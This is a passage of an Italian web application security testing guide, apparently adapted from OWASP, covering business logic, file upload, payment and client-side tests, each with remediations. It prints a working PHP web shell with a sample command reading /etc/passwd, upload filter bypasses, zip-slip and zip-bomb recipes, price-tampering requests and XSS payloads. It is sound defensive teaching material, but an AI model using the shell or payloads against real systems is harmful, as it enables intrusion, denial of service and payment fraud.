* Elencare i componenti dell'applicazione o del sistema che potrebbero essere influenzati, ad esempio log o database.
* Per ciascun componente identificato, provare a leggere, modificare o rimuovere le sue informazioni. Ad esempio, i file di log dovrebbero essere identificati e i tester dovrebbero cercare di manipolare i dati/informazioni raccolti.

**Rimedio**
* L'applicazione dovrebbe seguire rigidi controlli di accesso su come i dati e gli artefatti possono essere modificati e letti, e attraverso canali fidati che garantiscano l'integrità dei dati. 
* Dovrebbero essere impostati corretti log per rivedere e garantire che non ci siano accessi o modifiche non autorizzate.
* Assicurarsi che tutti gli endpoint siano protetti da controlli di accesso basati sui ruoli. Utilizzare framework di autenticazione robusti (ad es. OAuth, JWT) per gestire le sessioni utente.
* Verificare sempre le autorizzazioni lato server per ogni richiesta, indipendentemente dai controlli effettuati sul client.

#### 5 - Test per il timing dei processi
È possibile che gli attaccanti possano raccogliere informazioni su un'applicazione monitorando il tempo necessario per completare un compito o fornire una risposta. Inoltre, gli attaccanti potrebbero essere in grado di manipolare e compromettere i flussi di processo aziendale progettati semplicemente mantenendo aperte le sessioni attive e non inviando le loro transazioni nel periodo di tempo "atteso".

*Per esempio*
Un'applicazone di slot machine o scommesse, potrebbero avere un'elaborazione più lunga appena prima di una grande vincita, dando informazioni all'attccante.

*Per esempio*
Processi che necessitano di nome utente e password potrebbero metterci di pià a ritornare un errore nel caso il nome utente sia sbagliato o nel caso il nome utente sia giusto, rendendo possibile anche l'enumerazione degli utenti senza messaggi di errore prettamente diversi.

*Per esempio*
Supponiamo che un sito di e-commerce per metalli preziosi consenta agli utenti di effettuare acquisti con un preventivo basato sul prezzo di mercato al momento dell'accesso. E se un attaccante si collega e piazza un ordine ma non completa la transazione fino a dopo, solo se il prezzo dei metalli aumenta? L'attaccante otterrà il prezzo iniziale più basso?

**Come testarlo**
Il tester dovrebbe identificare quali processi dipendono dal tempo, sia che si tratti di una finestra per completare un compito, sia che si tratti del tempo di esecuzione tra due processi che potrebbero consentire di bypassare determinati controlli.

Il tester dovrebbe disegnare un diagramma di come fluiscono i processi, i punti di iniezione e preparare in anticipo le richieste da lanciare ai processi vulnerabili. Una volta fatto, dovrebbe essere effettuata un'analisi approfondita per identificare differenze nell'esecuzione del processo e verificare se il processo si comporta in modo anomalo rispetto alla logica aziendale concordata.

**Rimedio**
* Sviluppare applicazioni tenendo presente il tempo di elaborazione. Se gli attaccanti possono ottenere qualche tipo di vantaggio conoscendo i diversi tempi di elaborazione e risultati, aggiungere passaggi extra o elaborazione in modo che, indipendentemente dai risultati, vengano forniti nello stesso intervallo di tempo.
* L'applicazione/sistema deve avere meccanismi in atto per non consentire agli attaccanti di estendere le transazioni oltre un periodo di tempo "accettabile". Ciò può essere fatto annullando o reimpostando le transazioni dopo un determinato periodo di tempo.

#### 6 - Limiti del numero di volte che una funzione può essere utilizzata
Se un'applicazione di e-commerce crea uno sconto con un certo codice, dopo essere stato utilizzato una volta per account (o un tot di volte in base alla scelta dell'azienda), il codice non deve più essere utilizzabile.

**Come testarlo**
Trovare le funzioni che non dovrebbero essere utilizzabili più di un predeterminato numero di volte.
Creare casi di abuso/misuso per ciascuna di esse che possano consentire a un utente di usare più volte questa funzione.

**Rimedio**
* L'applicazione dovrebbe impostare controlli rigidi per prevenire l'abuso dei limiti. Ciò può essere realizzato impostando un coupon come non più valido a livello di database, impostando un limite di conteggio per utente a livello di backend o database, poiché tutti gli utenti devono essere identificati tramite una sessione, a seconda di ciò che è meglio per il requisito aziendale.

#### 7 - Test per l'elusione dei flussi di lavoro
Le vulnerabilità dei flussi di lavoro riguardano qualsiasi tipo di vulnerabilità che consente all'attaccante di abusare di un'applicazione/sistema in un modo che gli permette di eludere (non seguire) il flusso di lavoro progettato/inteso.

*Esempio*
Molti di noi ricevono qualche tipo di "punti club/loyalty" per acquisti presso supermercati e stazioni di servizio. Supponiamo che un utente sia in grado di avviare una transazione legata al proprio account e poi, dopo che i punti sono stati aggiunti al proprio account club/loyalty, cancellare la transazione o rimuovere articoli dal proprio "carrello" e pagare. In questo caso, il sistema non dovrebbe applicare punti/crediti all'account fino a quando non viene effettuato il pagamento, oppure i punti/crediti dovrebbero essere "annullati" se l'incremento dei punti/crediti non corrisponde al pagamento finale. Tenendo presente ciò, un attaccante potrebbe avviare transazioni e annullarle per accumulare punti senza effettivamente acquistare nulla.

*Esempio 2*
Un sistema di bacheca elettronica potrebbe essere progettato per garantire che i post iniziali non contengano volgarità basate su una lista contro la quale il post viene confrontato. Se una parola presente nella lista di esclusione viene trovata nel testo inserito dall'utente, la submission non viene pubblicata. Tuttavia, una volta che una submission è pubblicata, il mittente può accedere, modificare e cambiare i contenuti della submission per includere parole presenti nella lista di volgarità/esclusione, poiché durante la modifica il post non viene mai confrontato nuovamente. Tenendo presente ciò, gli attaccanti potrebbero aprire una discussione iniziale vuota o minimale e poi aggiungere quello che vogliono come aggiornamento.

**Come testarlo**
*Metodo 1*
* Avviare una transazione attraversando l'applicazione fino ai punti che attivano crediti/points all'account degli utenti.
* Annullare la transazione o ridurre il pagamento finale in modo che i valori dei punti debbano essere ridotti e controllare il sistema di punti/crediti per garantire che i punti/crediti appropriati siano stati registrati.

*Metodo 2*
* Su un sistema di gestione dei contenuti o di bacheca, inserire e salvare testo o valori iniziali validi.
* Poi provare ad aggiungere, modificare e rimuovere dati che lascerebbero i dati esistenti in uno stato invalido o con valori non validi per garantire che all'utente non sia permesso salvare informazioni errate. Alcuni dati o informazioni "non validi" possono essere parole specifiche (volgarità) o argomenti specifici (come questioni politiche).

#### 8 - Caricamento di tipi di file inaspettati
Il rischio è che consentendo agli utenti di caricare file, gli attaccanti possano inviare un tipo di file inaspettato che potrebbe essere eseguito e avere un impatto negativo sull'applicazione o sul sistema attraverso attacchi che potrebbero compromettere il sito, eseguire comandi remoti, navigare nei file di sistema, accedere alle risorse locali, attaccare altri server o sfruttare vulnerabilità locali, solo per citarne alcuni.

L'applicazione potrebbe aspettarsi solo determinati tipi di file per l'elaborazione, come file .csv o .txt. L'applicazione potrebbe non convalidare il file caricato per estensione (per una convalida a bassa affidabilità) o contenuto (per una convalida ad alta affidabilità). Questo potrebbe comportare risultati imprevisti nel sistema o nel database all'interno dell'applicazione/sistema o fornire agli attaccanti metodi aggiuntivi per sfruttare l'applicazione/sistema.

**Rimedio**
* Le applicazioni dovrebbero essere sviluppate con meccanismi per accettare e manipolare solo file "accettabili" che le altre funzionalità dell'applicazione sono pronte a gestire e si aspettano. Alcuni esempi specifici includono: liste di rifiuto o di approvazione delle estensioni dei file, utilizzo di "Content-Type" dall'intestazione, o utilizzo di un riconoscitore di tipo file, il tutto per consentire solo tipi di file specificati nel sistema.

#### 9 - Test per l'upload di dati maligni
Sebbene la convalida dell'input sia ampiamente compresa per i campi di input basati su testo, è più complicato implementarla quando vengono accettati file. Anche se molti siti implementano restrizioni semplici basate su un elenco di estensioni permesse (o bloccate), ciò non è sufficiente per impedire agli aggressori di caricare tipi di file legittimi che contengono contenuti dannosi.

**come testarlo**
**Tipi di file maligni**
Il modo più semplice è quello di permettere l'upload solamente di file che sono sicuri (can be trusted).

*Web shell*
Se il server è configurato per l'esecuzione di codice, è possibile ottenere l'esecuzione di comandi sul server caricando un file noto come web shell, che consente di eseguire codice arbitrario o comandi del sistema operativo. Affinché questo attacco abbia successo, il file deve essere caricato all'interno della webroot e il server deve essere configurato per eseguire il codice.
Caricare questo tipo di shell su un server rivolto a Internet è pericoloso, perché consente a chiunque conosca (o indovini) la posizione della shell di eseguire codice sul server.

L'esempio sotto mostra una semplice web shell in PHP che esegue comandi di sistema passati con un comando GET e che possono essere acceduti solamente da un IP specifico.

    <?php
        if ($_SERVER['REMOTE_HOST'] === "FIXME") { // Set your IP address here
            if(isset($_REQUEST['cmd'])){
                $cmd = ($_REQUEST['cmd']);
                echo "<pre>\n";
                system($cmd);
                echo "</pre>";
            }
        }
    ?>

Una volta che la shell è uploadata con un nome random, puoi eseguire comandi di sistema passanfoli nel parametro GET `cmd`:

    https://example.org/7sna8uuorvcx3x4fx.php?cmd=cat+/etc/passwd

*Evasione dei filtri*
Il primo passo è determinare quali filtri consentono o bloccano contenuti e dove sono implementati. Se le restrizioni vengono applicate lato client utilizzando JavaScript, possono essere facilmente eluse con un proxy di intercettazione.
Se il filtraggio è effettuato lato server, si possono tentare varie tecniche per bypassarlo, tra cui:
* Cambiare il valore di Content-Type in image/jpeg nella richiesta HTTP.
* Modificare le estensioni in estensioni meno comuni, come file.php5, file.shtml, file.asa, file.jsp, file.jspx, file.aspx, file.asp, file.phtml, file.cshtml.
* Cambiare la capitalizzazione dell'estensione, come file.PhP o file.AspX.
* Se la richiesta include più nomi di file, modificarli in valori diversi.
* Utilizzare caratteri speciali finali come spazi, punti o caratteri nulli, come file.asp..., file.php;jpg, file.asp%00.jpg, 1.jpg%00.php.
* In versioni mal configurate di Nginx, caricare un file come test.jpg/x.php potrebbe consentire l'esecuzione come x.php.

**Tipi di contenuti maligni**
Una volta convalidato il tipo di file, è importante anche garantire che i contenuti del file siano sicuri. Questo è significativamente più difficile, poiché i passaggi richiesti variano a seconda dei tipi di file consentiti.

*Malware*
Le applicazioni dovrebbero generalmente scansionare i file caricati con software anti-malware per garantire che non contengano nulla di malevolo. Il modo più semplice per testarlo è utilizzare il [file di test EICAR](https://www.eicar.org/download-anti-malware-testfile/), che è un file sicuro contrassegnato come malevolo da tutti i software anti-malware.

A seconda del tipo di applicazione, potrebbe essere necessario testare altri tipi di file pericolosi, come documenti Office contenenti macro malevole. Strumenti come [Metasploit Framework](https://github.com/rapid7/metasploit-framework) e [Social Engineer Toolkit (SET)](https://github.com/trustedsec/social-engineer-toolkit) possono essere utilizzati per generare file maligni per vari formati. 

Quando questo file viene caricato, dovrebbe essere rilevato e messo in quarantena o eliminato dall'applicazione. A seconda di come l'applicazione elabora il file, potrebbe non essere ovvio se ciò sia avvenuto.

*Attraversamento delle directory degli archivi*
Se l'applicazione estrae archivi (come i file ZIP), potrebbe essere possibile scrivere in posizioni non previste utilizzando il directory traversal. Questo può essere sfruttato caricando un file ZIP dannoso che contiene percorsi che attraversano il file system utilizzando sequenze come ..\..\..\..\..\shell.php.

<iframe width="537" height="315" src="https://www.youtube.com/embed/l1MT5lr4p9o" title="Zip Slip Vulnerability Exploit" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe>

Vanno dunque implementati sia modi per i quali non sia possibile per un file uploadato risalire alla root di un programma e anche metodi di validazione del contenuto zip, giusto per avere un altro layer di sicurezza.

Seguite i passaggi seguenti per creare un file ZIP che possa abusare del codice vulnerabile di cui sopra una volta caricato sul server web:

    # Open a new terminal and create a tree structure
    # (more directory levels might be required based on the system being targeted)
    mkdir -p a/b/c
    # Create a base file
    echo 'base' > a/b/c/base
    # Create a traversed file
    echo 'traversed' > traversed
    # You can double check the tree structure using `tree` at this stage
    # Navigate to a/b/c root directory
    cd a/b/c
    # Compress the files
    zip test.zip base ../../../traversed
    # Verify compressed files content
    unzip -l test.zip

*Bomba zip*
Una bomba ZIP (più comunemente nota come bomba di decompressione) è un file di archivio che contiene un grande volume di dati. È progettata per causare un'interruzione del servizio esaurendo lo spazio su disco o la memoria del sistema target che tenta di estrarre l'archivio. Va notato che, sebbene il formato ZIP sia l'esempio più comune, anche altri formati sono interessati, incluso gzip (frequentemente usato per comprimere dati in transito).

A livello più semplice, una bomba ZIP può essere creata comprimendo un grande file composto da un singolo carattere. L'esempio seguente mostra come creare un file di 1MB che si decomprimerà a 1GB:

    dd if=/dev/zero bs=1M count=1024 | zip -9 > bomb.zip

Ci sono diversi metodi che possono essere utilizzati per ottenere rapporti di compressione molto più elevati, inclusi più livelli di compressione, [sfruttamento del formato ZIP](https://www.bamsoftware.com/hacks/zipbomb/) e [quine](https://research.swtch.com/zip) (che sono archivi che contengono una copia di se stessi, causando ricorsione infinita).

*File XML*
I file XML presentano diverse vulnerabilità potenziali, come le entità esterne XML (XXE) e attacchi di negazione del servizio, come l'[attacco "billion laughs"](https://en.wikipedia.org/wiki/Billion_laughs_attack).

*Altri tipi di file pericolosi*
* I file immagine devono essere controllati per la dimensione massima dei pixel/frames.
* I file CSV possono consentire attacchi di iniezione CSV.
* I file Office possono contenere macro o codice PowerShell dannoso.
* I PDF possono contenere JavaScript dannoso.

**Rimedi**
* Consenti solo le estensioni di file sicure. Tuttavia, non fare affidamento solo sulle estensioni, poiché possono essere facilmente ingannate.
* Verifica il tipo di contenuto dei file caricati usando le intestazioni HTTP e confrontalo con il tipo atteso.
* Integrare una soluzione di scansione antivirus per analizzare i file caricati e bloccare quelli malevoli.
* Imposta limiti sulla dimensione dei file caricati per evitare attacchi di Denial of Service (DoS) e per prevenire file enormi o compressi che possono causare problemi.
* Carica i file in directory isolate che non possono essere direttamente accessibili via HTTP.
* Assicurati che i file caricati non possano essere eseguiti come codice. Ad esempio, se i file sono caricati in una directory accessibile al web, usa misure di configurazione come disable o deny per non eseguire codice PHP o simile.
* Disattiva le funzioni PHP pericolose come exec, shell_exec, system, ecc., se non necessarie.
* Implementare controlli per verificare il contenuto effettivo dei file. Ad esempio, per i file immagine, verifica le dimensioni e il formato, mentre per i file CSV controlla il contenuto per possibili attacchi di iniezione.
* Prima di estrarre archivi come ZIP, verifica i percorsi dei file per prevenire attacchi di directory traversal.

Proteggere completamente contro il caricamento di file dannosi può essere complesso, e i passaggi esatti richiesti variano a seconda dei tipi di file caricati e di come questi file vengono elaborati o analizzati sul server. Questo argomento viene trattato più dettagliatamente nella [guida al caricamento file](https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html).

#### 10 - Test per le funzionalità di pagamento
**Come testarlo**
*Metodi di integrazione del gateway di pagamento*
Esistono diversi modi in cui le applicazioni possono integrare la funzionalità di pagamento, e l'approccio di test varierà a seconda di quale viene utilizzato. I metodi più comuni sono:

* Reindirizzare l'utente a un gateway di pagamento di terze parti.
* Caricare un gateway di pagamento di terze parti in un IFRAME nell'applicazione.
* Avere un modulo HTML che effettua una richiesta POST cross-domain a un gateway di pagamento di terze parti.
* Accettare i dettagli della carta direttamente e poi effettuare una POST dal backend dell'applicazione all'API del gateway di pagamento.

*Manomissione del prezzo*
Quando si aggiunge un articolo al carrello, l'applicazione dovrebbe includere solo l'articolo e una quantità, come nell'esempio di richiesta sottostante:

    POST /api/basket/add HTTP/1.1  
    Host: example.org  

    item_id=1&quantity=5  

Tuttavia, in alcuni casi l'applicazione potrebbe includere anche il prezzo, il che significa che potrebbe essere possibile manometterlo:

    POST /api/basket/add HTTP/1.1  
    Host: example.org  

    item_id=1&quantity=5&price=2.00  

*Sul gateway di pagamento*
Se il processo di checkout viene eseguito su un gateway di pagamento di terze parti, allora potrebbe essere possibile manomettere i prezzi tra l'applicazione e il gateway.

    <form action="https://example.org/process_payment" method="POST">
        <input type="hidden" id="merchant_id" value="123" />
        <input type="hidden" id="basket_id" value="456" />
        <input type="hidden" id="item_id" value="1" />
        <input type="hidden" id="item_quantity" value="5" />
        <input type="hidden" id="item_total" value="20.00" />
        <input type="hidden" id="shipping_total" value="2.00" />
        <input type="hidden" id="basket_total" value="22.00" />
        <input type="hidden" id="currency" value="GBP" />
        <input type="submit" id="submit" value="submit" />
    </form>

Modificando il modulo HTML o intercettando la richiesta POST, potrebbe essere possibile modificare i prezzi degli articoli e acquistarli effettivamente a un prezzo inferiore. Nota che molti gateway di pagamento rifiuteranno una transazione con un valore di zero, quindi un totale di 0.01 ha maggiori probabilità di avere successo. Tuttavia, alcuni gateway di pagamento potrebbero accettare valori negativi (utilizzati per elaborare rimborsi). Dove ci sono più valori (come i prezzi degli articoli, un costo di spedizione e il costo totale del carrello), tutti questi dovrebbero essere testati.

*iFrame*
Se il gateway di pagamento utilizza un IFRAME invece, potrebbe essere possibile eseguire un tipo di attacco simile modificando l'URL dell'IFRAME:

    <iframe src="https://example.org/payment_iframe?merchant_id=123&basket_total=22.00" />

*Dettagli della transazione crittografati*
Per prevenire la manomissione delle transazioni, alcuni gateway di pagamento crittografano i dettagli della richiesta che viene loro inviata. Ad esempio, PayPal lo fa utilizzando la crittografia a chiave pubblica.

La prima cosa da provare è fare una richiesta non crittografata, poiché alcuni gateway di pagamento consentono transazioni non sicure a meno che non siano state specificamente configurate per rifiutarle.

Se questo non funziona, è necessario trovare la chiave pubblica utilizzata per crittografare i dettagli della transazione, che potrebbe essere esposta in un backup dell'applicazione, o se riesci a trovare una vulnerabilità di traversamento di directory.

In alternativa, è possibile che l'applicazione riutilizzi la stessa coppia di chiavi pubbliche/private per il gateway di pagamento e il suo certificato digitale. Puoi ottenere la chiave pubblica dal server con il seguente comando:

    echo -e '\0' | openssl s_client -connect example.org:443 2>/dev/null | openssl x509 -pubkey -noout

Una volta ottenuta questa chiave, puoi provare a creare una richiesta crittografata (basata sulla documentazione del gateway di pagamento) e inviarla al gateway per vedere se viene accettata.

*Manomissione della valuta*
Se non è possibile manomettere i prezzi, potrebbe essere possibile cambiare la valuta con la quale si paga per esempio da GBP a USD.

*Codici sconto*
Se l'applicazione supporta codici sconto, dovrebbero essere implementati metodi per controllare che questi non siano facilmente indovinabili, che non si possa fare un attacco forza bruta, che non si possano inserire caratteri jolly come % o * ecc...

Ci sarebbero molti altri metodi da controllare, ma non è lo scopo di questa guida. 
Possiamo comunque dare delle linee guida generali che è sempre meglio seguire.

**Rimedi**
* Evitare di inviare, memorizzare o elaborare i dettagli delle carte ovunque possibile
* Esaminare la documentazione del gateway di pagamento e utilizzare tutte le funzionalità di sicurezza disponibili
* Gestire tutte le informazioni relaive ai prezzi sul lato server
* Implementare una valida input validation e vincoli di logica di business (come controllare numeri o valori di articolo negativi).
* Assicurarsi che il flusso di pagamento dell'applicazione sia robusto e che i passaggi non possano essere eseguiti in modo non sequenziale.

### K - Test lato client
#### 1 - Test per il Cross Site basato sul DOM
Il cross-site scripting basato sul DOM (Document Object Model) è il termine per i bug XSS che derivano da contenuti attivi lato browser su una pagina, tipicamente JavaScript, che ottiene input dall'utente attraverso una sorgente e lo utilizza in un sink, portando all'esecuzione di codice iniettato. Questo documento discute solo i bug JavaScript che portano a XSS.

A causa della loro natura, le vulnerabilità XSS basate sul DOM possono essere eseguite in molte situazioni senza che il server possa determinare cosa viene effettivamente eseguito. Questo può rendere molte tecniche generali di filtraggio e rilevamento XSS impotenti contro tali attacchi.

*Esempio*
        
    <script>
    document.write("Il sito è: " + document.location.href + ".");
    </script>

Un attaccante può aggiungere `#<script>alert('xss')</script>`all'URL della pagina interessata, che, una volta eseguito, visualizzerà un avviso. In questo caso, il codice aggiunto non verrebbe inviato al server poiché tutto ciò che segue il carattere # non viene considerato parte della query dal browser, ma come un frammento. In questo esempio, il codice viene eseguito immediatamente e viene visualizzato un avviso di "xss" dalla pagina. A differenza dei tipi più comuni di cross-site scripting (riflessi e memorizzati), in cui il codice viene inviato al server e poi di nuovo al browser, questo viene eseguito direttamente nel browser dell'utente senza contatto con il server.

**Come testarlo**
Le applicazioni JavaScript differiscono notevolmente da altri tipi di applicazioni poiché sono spesso generate dinamicamente dal server. Per capire quale codice viene eseguito, il sito web in fase di test deve essere esplorato per determinare tutte le istanze di JavaScript in esecuzione e dove viene accettato l'input dell'utente. Molti siti web si basano su ampie librerie di funzioni, che spesso si estendono fino a centinaia di migliaia di righe di codice e non sono state sviluppate internamente. In questi casi, il testing top-down diventa spesso l'unica opzione praticabile, poiché molte funzioni di basso livello non vengono mai utilizzate, e analizzarle per determinare quali siano sink richiederebbe più tempo di quello generalmente disponibile. Lo stesso vale anche per il testing top-down se gli input o la loro mancanza non vengono identificati fin dall'inizio.

L'input dell'utente si presenta in due forme principali:
* Input scritto nella pagina dal server in un modo che non consente XSS diretto, e

        var data = "<escaped data from server>";
        var result = someFunction("<escaped data from server>");

* Input ottenuto da oggetti JavaScript lato client.

        var data = window.location;
        var result = someFunction(window.referrer);

Sebbene ci sia poca differenza nel codice JavaScript su come vengono recuperati, è importante notare che quando l'input viene ricevuto tramite il server, il server può applicare qualsiasi permutazione ai dati che desidera. 

Inoltre, JavaScript viene spesso eseguito al di fuori dei blocchi `<script>`, come evidenziato dai molti vettori che in passato hanno portato all'aggiramento dei filtri XSS. Quando si esplora l'applicazione, è importante notare l'uso di script in luoghi come gestori di eventi e blocchi CSS con attributi di espressione. 

<br>

Il testing automatizzato ha avuto solo un successo molto limitato nell'identificare e convalidare il XSS basato sul DOM poiché di solito identifica XSS inviando un payload specifico e tenta di osservarlo nella risposta del server.

Il testing manuale dovrebbe quindi essere intrapreso e può essere effettuato esaminando le aree del codice in cui i parametri vengono richiamati e che potrebbero essere utili a un attaccante. Esempi di tali aree includono luoghi in cui il codice viene scritto dinamicamente nella pagina e altrove dove il DOM viene modificato o dove gli script vengono eseguiti direttamente.

**Rimedi**
* Assicurati di sanificare e validare tutti i dati in ingresso prima di utilizzarli nel DOM. Utilizza librerie di sanitizzazione per rimuovere caratteri speciali e potenzialmente pericolosi.
* Evita di usare document.write() per inserire contenuti nel DOM, poiché può facilmente portare a vulnerabilità XSS. Utilizza invece metodi più sicuri come element.innerHTML, element.textContent, o element.appendChild().
* Quando inserisci testo nel DOM, preferisci textContent a innerHTML, poiché il primo non esegue alcun codice HTML o script e quindi riduce il rischio di XSS.
* Imposta intestazioni di sicurezza come Content Security Policy (CSP) per limitare le origini da cui il contenuto può essere caricato e per vietare l'esecuzione di script non autorizzati.

Per misure volte a prevenire il XSS basato sul DOM, consultare la [Cheat Sheet per la Prevenzione del XSS Basato sul DOM](https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html).


1. **Test per l'auto Cross Site basato sul DOM**
    L'auto Cross-Site Scripting Basato su DOM è un attacco specifico che richiede una conoscenza preliminare del Cross-Site Scripting basato su DOM e un'ingegneria sociale riuscita. Il termine 'self' si riferisce al fatto che l'utente deve iniettare il payload nel campo di input, eseguendo così la vulnerabilità da solo. La vulnerabilità è ulteriormente specifica, poiché la Content Security Policy (CSP) del sito web può bloccare l'esecuzione degli script.

    In questo scenario si utilizzerà il termine "sink" nel seguente modo: In informatica, un sink, event sink o data sink è una classe o funzione progettata per ricevere input o eventi da un altro oggetto o funzione. Pertanto, per identificare possibili vulnerabilità, dobbiamo prima identificare i sink dell'applicazione che vogliamo testare.

    <br>

    **Come testarlo**
    1. Cercare sink vulnerabili che consentano input da parte dell'utente.
    2. Una volta identificato un possibile sink, si può inserire un payload.
    3. Controllare il registro degli errori negli strumenti per sviluppatori del browser per vedere il risultato e trarre le proprie conclusioni.
    4. Verificare se un attaccante potrebbe convincere un utente a inserire il payload senza richiedere una conoscenza tecnica approfondita.

    <br>

    *Esempio* 
    Nel caso, la seguente funzione JavaScript viene eseguita sul sito web https://example.com.

        //Codice del Modulo Marketo
        function strip(html) {
            var tmp = document.createElement("DIV");
            tmp.innerHTML = html;
            return tmp.textContent || tmp.innerText || "";
        }

        $('form').submit(function() {
            $('textarea').val(function() {
                return strip($(this).val());
            });
        });

    L'abuso di questa funzionalità può essere descritto come segue:
    * Il gestore dell'evento di submit passa il valore attuale di qualsiasi elemento textarea alla funzione strip.
    * Questa funzione crea un nuovo elemento div e imposta la proprietà innerHTML al valore fornito.
    * Nell'ultimo passaggio, restituisce la proprietà textContent del div risultante.

    <br>

    Questo tipo di codice è tipicamente usato per rimuovere i tag HTML da una stringa, poiché la proprietà textContent contiene la stringa renderizzata dal browser quando l'HTML viene analizzato. Questo metodo è intrinsecamente insicuro perché utilizza innerHTML. Quando l'input dell'utente viene fornito alla proprietà innerHTML, viene analizzato dal browser web e può quindi portare all'esecuzione di JavaScript malevolo.

    <br>

    Il seguente payload può essere utilizzato per testare la vulnerabilità: `<img src=x onerror=alert(1) />`

    <br>

    La console degli sviluppatori mostrerebbe due errori: uno che indica che https://www.example.com/x è stato richiesto e ha restituito un 404 (a causa dell'attributo src del tag img). Un altro che riporta una violazione della CSP del sito web.

    <br>

    Questo secondo errore si è verificato perché il browser tenta di eseguire il codice JavaScript nell'attributo onerror, ma la CSP del sito ha impedito l'esecuzione. Eseguire le stesse azioni in un browser con la CSP disabilitata ha consentito l'esecuzione del JavaScript nell'attributo onerror.

    <br>

    Un attaccante potrebbe sfruttare questa vulnerabilità convincendo un utente a incollare un payload malevolo nel campo 'messaggio' del modulo di contatto e poi cliccare sul pulsante 'invia messaggio'. Questo attacco potrebbe essere potenziato convincendo l'utente a utilizzare una versione del browser che non supporta la CSP.

#### 2 - Test per l'esecuzione di Javascript
Una vulnerabilità di iniezione di JavaScript è un sottotipo di cross site scripting (XSS) che comporta la possibilità di iniettare codice JavaScript arbitrario eseguito dall'applicazione all'interno del browser della vittima.

Le vulnerabilità di iniezione di JavaScript possono verificarsi quando l'applicazione non dispone di una corretta validazione degli input e degli output forniti dall'utente. 

    var rr = location.search.substring(1);
    if(rr) {
        window.location=decodeURIComponent(rr);
    }

Ciò implica che un attaccante potrebbe iniettare codice JavaScript semplicemente inviando la seguente stringa di query: `www.vittima.com/?javascript:alert(1)`.

**Come testarlo**
Considera il seguente esercizio di DOM XSS.

La pagina contiene il seguente script:

    <script>
    function loadObj(){
        var cc=eval('('+aMess+')');
        document.getElementById('mess').textContent=cc.message;
    }

    if(window.location.hash.indexOf('message')==-1) {
        var aMess='({"message":"Hello User!"})';
    } else {
        var aMess=location.hash.substr(window.location.hash.indexOf('message=')+8)
    }
    </script>

Il codice sopra contiene una sorgente location.hash che è controllata dall'attaccante, il quale può iniettare direttamente un codice JavaScript nel valore del messaggio per prendere il controllo del browser dell'utente.

**Rimedi**
* Utilizzare eval() per eseguire codice JavaScript dinamicamente è rischioso. È meglio evitare completamente il suo uso e trovare metodi alternativi per elaborare i dati.
* Assicurarsi che qualsiasi dato proveniente da location.hash o da qualsiasi altra fonte esterna sia correttamente validato e sanitizzato. Questo significa filtrare e rimuovere qualsiasi carattere o stringa potenzialmente pericolosa.
* Se si devono utilizzare dati JSON, si potrebbe considerare di usare JSON.parse() al posto di eval(), poiché JSON.parse() è più sicuro e non esegue codice arbitrario.

#### 3 - Test per l'iniezione di HTML
Questa vulnerabilità si verifica quando l'input dell'utente non è correttamente sanitizzato e l'output non è codificato. Un'iniezione consente all'attaccante di inviare una pagina HTML malevola a una vittima. Il browser target non sarà in grado di distinguere (fidarsi) delle parti legittime da quelle malevole della pagina e, di conseguenza, analizzerà ed eseguirà l'intera pagina nel contesto della vittima.

Esiste una vasta gamma di metodi e attributi che possono essere utilizzati per rendere contenuti HTML. Se questi metodi ricevono un input non affidabile, c'è un alto rischio di vulnerabilità da iniezione di HTML. Ad esempio, codice HTML malevolo può essere iniettato tramite il metodo JavaScript innerHTML, solitamente usato per rendere il codice HTML inserito dall'utente. Se le stringhe non sono correttamente sanificate, il metodo può consentire l'iniezione di HTML. Una funzione JavaScript che può essere utilizzata a questo scopo è document.write().

Il seguente esempio mostra un frammento di codice vulnerabile che consente di utilizzare un input non validato per creare HTML dinamico nel contesto della pagina:

    var userposition = location.href.indexOf("user=");
    var user = location.href.substring(userposition + 5);
    document.getElementById("Welcome").innerHTML = " Hello, " + user;

Il seguente esempio mostra un codice vulnerabile che utilizza la funzione `document.write()`:

    var userposition = location.href.indexOf("user=");
    var user = location.href.substring(userposition + 5);
    document.write("<h1>Hello, " + user + "</h1>");

In entrambi gli esempi, questa vulnerabilità può essere sfruttata con un input come:

    http://vulnerable.site/page.html?user=<img%20src='aaa'%20onerror=alert(1)>
    
Questo input aggiungerà un tag immagine alla pagina che eseguirà codice JavaScript arbitrario inserito dall'utente malevolo nel contesto HTML.

**Come testarlo**
Considera il seguente esercizio DOM XSS: http://www.domxss.com/domxss/01_Basics/06_jquery_old_html.html

    <script src="../js/jquery-1.7.1.js"></script>
    <script>
    function setMessage(){
        var t = location.hash.slice(1);
        $("div[id=" + t + "]").text("The DOM is now loaded and can be manipulated.");
    }
    $(document).ready(setMessage);
    $(window).bind("hashchange", setMessage);
    </script>
    <body>
        <script src="../js/embed.js"></script>
        <span><a href="#message"> Show Here</a><div id="message">Showing Message1</div></span>
        <span><a href="#message1"> Show Here</a><div id="message1">Showing Message2</div></span>
        <span><a href="#message2"> Show Here</a><div id="message2">Showing Message3</div></span>
    </body>

È possibile iniettare codice HTML.

**Rimedi**

#### 4 - Test per il Redirect URL lato client
Si tratta di un difetto di validazione dell'input che si verifica quando un'applicazione accetta input controllati dall'utente che specificano un link che porta a un URL esterno potenzialmente malevolo. Questo tipo di vulnerabilità potrebbe essere utilizzato per realizzare un attacco di phishing o per reindirizzare una vittima a una pagina infetta.

Poiché il reindirizzamento è originato dall'applicazione reale, i tentativi di phishing potrebbero apparire più affidabili.ù

    http://www.target.site?#redirect=www.fake-target.site
    
L'open redirection potrebbe essere utilizzato anche per creare un URL che bypassa i controlli di accesso dell'applicazione e indirizza l'attaccante a funzioni privilegiate a cui normalmente non potrebbe accedere.


**Come testarlo**
Quando i tester controllano manualmente questo tipo di vulnerabilità, identificano prima se ci sono reindirizzamenti lato client implementati nel codice client. Questi reindirizzamenti possono essere implementati, per esempio in JavaScript, utilizzando l'oggetto window.location. Questo può essere utilizzato per indirizzare il browser a un'altra pagina semplicemente assegnando una stringa.

    var redir = location.hash.substring(1);
    if (redir) {
        window.location='http://'+decodeURIComponent(redir);
    }

In questo esempio, lo script non esegue alcuna validazione della variabile `redir`, che contiene l'input fornito dall'utente tramite la query string. Poiché non viene applicata alcuna forma di codifica, questo input non validato viene passato all'oggetto `window.location`, creando una vulnerabilità di redirect URL.

Ciò implica che un attaccante potrebbe reindirizzare la vittima a un sito malevolo semplicemente inviando la seguente query string:

    http://www.victim.site/?#www.malicious.site
    
